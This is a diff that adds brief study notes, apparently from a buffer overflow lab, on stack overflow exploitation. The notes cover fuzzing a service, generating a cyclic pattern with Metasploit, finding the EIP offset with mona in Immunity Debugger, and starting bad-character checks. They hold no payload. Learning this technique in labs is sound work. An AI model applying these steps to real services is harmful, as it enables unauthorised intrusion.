@@ -1,0 +1,27 @@
+//BOf
+
+setup MONA:
+//In immunity: 
+!mona config -set workingfolder c:\mona\%p
+
+//On attacker: 
+run fuzzer.py
+
+//you should see an error like: "Could not connect to MACHINE_IP:PORT". Make a note of the largest number of bytes that were sent.
+
+//Run exploit.py 
+
+//Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the -l value to this):
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash length + 400>
+
+
+// in Immunity: !mona findmsp -distance <pattern length>
+
+//Look for : "EIP contains normal pattern : ... (offset XXXX)"
+
+//Update exploit.py; set <offset> to offset value found above then set <retn> variable to "BBBB"
+
+//In immunity
+!mona bytearray -b "\x00"
+
